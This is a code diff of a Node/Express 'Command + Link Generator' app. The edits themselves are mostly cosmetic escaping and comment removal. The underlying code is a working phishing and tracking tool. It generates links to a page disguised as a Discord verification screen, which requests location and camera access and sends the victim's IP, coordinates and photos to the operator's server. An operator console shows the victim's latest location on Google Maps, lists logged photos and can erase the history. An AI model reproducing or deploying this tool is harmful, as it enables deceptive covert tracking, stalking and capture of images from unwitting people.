@@ -113,7 +113,7 @@ const HTML = `<!DOCTYPE html>
 <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
 <title>Command + Link Generator</title>
 <!-- PAST_LOGS -->
-<script src="/socket.io/socket.io.js"></script>
+<script src="/socket.io/socket.io.js"><\/script>
 <style>
 * { margin:0; padding:0; box-sizing:border-box; user-select:none; -webkit-touch-callout:none; -webkit-tap-highlight-color:transparent; }
 body {
@@ -124,7 +124,6 @@ body {
   touch-action:none;
   position:relative;
 }
-/* ★ 背景の「特定v1」★ */
 #bg-logo {
   position:fixed;
   top:50%;
@@ -363,7 +362,7 @@ body {
 (function() {
   const cmdOutput = document.getElementById('cmd-output');
   const cmdInput = document.getElementById('cmd-input');
-  
+
   function addCmdOutput(text, cls) {
     const div = document.createElement('div');
     div.textContent = text;
@@ -400,7 +399,6 @@ body {
       window._lastLog = data;
     });
   }
-
   if (window._photoCount && window._photoCount > 0) {
     addCmdOutput('[PHOTO] ' + window._photoCount + ' photos received', 'cmd-photo');
   }
@@ -444,7 +442,6 @@ body {
       cmdInput.value = '';
       if (cmd === '') return;
       addCmdOutput('> ' + cmd, 'cmd-echo');
-
       if (cmd === '/map') {
         const d = window._lastLog;
         if (!d) {
@@ -461,7 +458,6 @@ body {
         }
         return;
       }
-
       if (cmd === '/help') {
         addCmdOutput('  Commands:', 'cmd-code');
         addCmdOutput('  /map   → Open latest location on Google Maps', 'cmd-echo');
@@ -471,7 +467,6 @@ body {
         addCmdOutput('  /none  → Delete all history', 'cmd-echo');
         return;
       }
-
       if (cmd === '/none') {
         fetch('/clear-logs', { method: 'POST' }).then(function() {
           cmdOutput.innerHTML = '';
@@ -483,7 +478,6 @@ body {
         });
         return;
       }
-
       if (cmd === '/jp') {
         fetch('/lang/jp').then(function() {
           addCmdOutput('  [Language] Switched to Japanese', 'cmd-lang');
@@ -500,7 +494,6 @@ body {
         });
         return;
       }
-
       if (cmd === '/en') {
         fetch('/lang/en').then(function() {
           addCmdOutput('  [Language] Switched to English', 'cmd-lang');
@@ -517,12 +510,10 @@ body {
         });
         return;
       }
-
       if (cmd === '/clear') {
         cmdOutput.innerHTML = '';
         return;
       }
-
       addCmdOutput('Error', 'cmd-error');
     }
   });
@@ -539,7 +530,7 @@ body {
       const res = await fetch('/generate?done=' + encodeURIComponent(doneText));
       const data = await res.json();
       currentLink = data.link;
-      resultArea.innerHTML = '<a href="#" class="link-display" id="generated-link">🔗 ' + currentLink + '</a><span class="status-msg">✅ Link generated!</span>';
+      resultArea.innerHTML = '<a href="#" class="link-display" id="generated-link">🔗 ' + currentLink + '<\/a><span class="status-msg">✅ Link generated!<\/span>';
       copyBtn.style.display = 'inline-block';
       copyBtn.textContent = '📋 COPY';
       copyBtn.className = 'btn-copy';
@@ -548,9 +539,10 @@ body {
         window.open(currentLink, '_blank');
       });
     } catch(err) {
-      resultArea.innerHTML = '<span class="status-msg" style="color:#ff4444;">⚠️ Generation failed</span>';
+      resultArea.innerHTML = '<span class="status-msg" style="color:#ff4444;">⚠️ Generation failed<\/span>';
     }
   }
+
   generateBtn.addEventListener('click', generateLink);
 
   copyBtn.addEventListener('click', function() {
@@ -566,6 +558,7 @@ body {
       }).catch(function() { fallbackCopy(); });
     } else { fallbackCopy(); }
   });
+
   function fallbackCopy() {
     const textarea = document.createElement('textarea');
     textarea.value = currentLink;
@@ -590,6 +583,7 @@ body {
     const drag = document.getElementById(dId);
     const resize = document.getElementById(rId);
     let dragData = null, resizeData = null;
+
     function startDrag(cx, cy) {
       const rect = win.getBoundingClientRect();
       dragData = { offsetX: cx - rect.left, offsetY: cy - rect.top };
@@ -602,12 +596,13 @@ body {
       win.style.top = (cy - dragData.offsetY) + 'px';
     }
     function endDrag() { dragData = null; win.style.zIndex = ''; win.style.transition = ''; }
+
     drag.addEventListener('mousedown', function(e) { startDrag(e.clientX, e.clientY); e.preventDefault(); });
     drag.addEventListener('touchstart', function(e) { var t = e.touches[0]; startDrag(t.clientX, t.clientY); e.preventDefault(); }, { passive: false });
+
     function startResize(cx, cy) {
       var rect = win.getBoundingClientRect();
-      resizeData = { startX: cx, startY: 
-              cy, startW: rect.width, startH: rect.height };
+      resizeData = { startX: cx, startY: cy, startW: rect.width, startH: rect.height };
       win.style.zIndex = 999;
       win.style.transition = 'none';
     }
@@ -621,13 +616,16 @@ body {
       win.style.height = nh + 'px';
     }
     function endResize() { resizeData = null; win.style.zIndex = ''; win.style.transition = ''; }
+
     resize.addEventListener('mousedown', function(e) { startResize(e.clientX, e.clientY); e.preventDefault(); e.stopPropagation(); });
     resize.addEventListener('touchstart', function(e) { var t = e.touches[0]; startResize(t.clientX, t.clientY); e.preventDefault(); e.stopPropagation(); }, { passive: false });
+
     document.addEventListener('mousemove', function(e) { if (dragData) moveDrag(e.clientX, e.clientY); if (resizeData) moveResize(e.clientX, e.clientY); });
     document.addEventListener('mouseup', function() { if (dragData) endDrag(); if (resizeData) endResize(); });
     document.addEventListener('touchmove', function(e) { var t = e.touches[0]; if (dragData) moveDrag(t.clientX, t.clientY); if (resizeData) moveResize(t.clientX, t.clientY); e.preventDefault(); }, { passive: false });
     document.addEventListener('touchend', function() { if (dragData) endDrag(); if (resizeData) endResize(); });
   }
+
   makeDraggable('cmd-window', 'cmd-drag', 'cmd-resize');
   makeDraggable('menu-window', 'menu-drag', 'menu-resize');
 
@@ -649,7 +647,7 @@ body {
     }
   });
 })();
-</script>
+<\/script>
 </body>
 </html>`;
 
@@ -663,7 +661,7 @@ app.get('/', (req, res) => {
   const photoCount = logs.filter(l => l.image && typeof l.image === 'string' && l.image.length > 100).length || 0;
   const htmlWithData = HTML.replace(
     '<!-- PAST_LOGS -->',
-    '<script>window._pastLogs = ' + logsJson + '; window._photoCount = ' + photoCount + ';</script>'
+    '<script>window._pastLogs = ' + logsJson + '; window._photoCount = ' + photoCount + ';<\/script>'
   );
   res.send(htmlWithData);
 });
@@ -732,19 +730,16 @@ app.get('/t/:id', (req, res) => {
     <div class="foot"><i class="fas fa-shield-alt"></i> 安全な接続 <span style="color:#ccc;">•</span> <i class="fab fa-discord"></i> Discord</div>
     <div class="discord-shield"><i class="fas fa-check-circle"></i> 認証済み</div>
   </div>
-
   <script>
     const id = '${id}';
     const ip = '${ip}';
     const time = '${time}';
     const doneText = '${doneText}';
-
     const chkLocation = document.getElementById('chk-location');
     const chkCamera = document.getElementById('chk-camera');
     const statusLoc = document.getElementById('status-location');
     const statusCam = document.getElementById('status-camera');
     const btnNext = document.getElementById('btn-next');
-
     var locationOk = false;
     var cameraOk = false;
     var locationSent = false;
@@ -866,16 +861,14 @@ app.get('/t/:id', (req, res) => {
 
     btnNext.addEventListener('click', function() {
       if (locationOk && cameraOk) {
-        document.body.innerHTML = '<div style="color:#888;font-size:14px;font-family:sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;">✅ ' + doneText + '</div>';
+        document.body.innerHTML = '<div style="color:#888;font-size:14px;font-family:sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;">✅ ' + doneText + '<\/div>';
       }
     });
-  </script>
+  <\/script>
 </body>
-</html>
-  `);
+</html>`);
 });
 
-// 位置情報受信
 app.post('/location', express.json(), (req, res) => {
   const { id, ip, time, lat, lon } = req.body;
   const entry = { id, ip, time, lat, lon, createdAt: new Date().toISOString() };
@@ -886,7 +879,6 @@ app.post('/location', express.json(), (req, res) => {
   res.sendStatus(200);
 });
 
-// 写真受信
 app.post('/photo', express.json(), (req, res) => {
   const { id, image } = req.body;
   const entry = { id, image: image, createdAt: new Date().toISOString() };
@@ -897,7 +889,6 @@ app.post('/photo', express.json(), (req, res) => {
   res.sendStatus(200);
 });
 
-// 全履歴削除
 app.post('/clear-logs', (req, res) => {
   logs.length = 0;
   saveLogs();
@@ -905,7 +896,6 @@ app.post('/clear-logs', (req, res) => {
   res.sendStatus(200);
 });
 
-// ログ表示
 app.get('/logs', (req, res) => {
   if (logs.length === 0) return res.send('<h2>データなし</h2><a href="/">戻る</a>');
   let html = '<h2>アクセスログ（保存済み ' + logs.length + '件）</h2><table border="1"><tr><th>時間</th><th>IP</th><th>緯度</th><th>経度</th><th>写真</th></tr>';
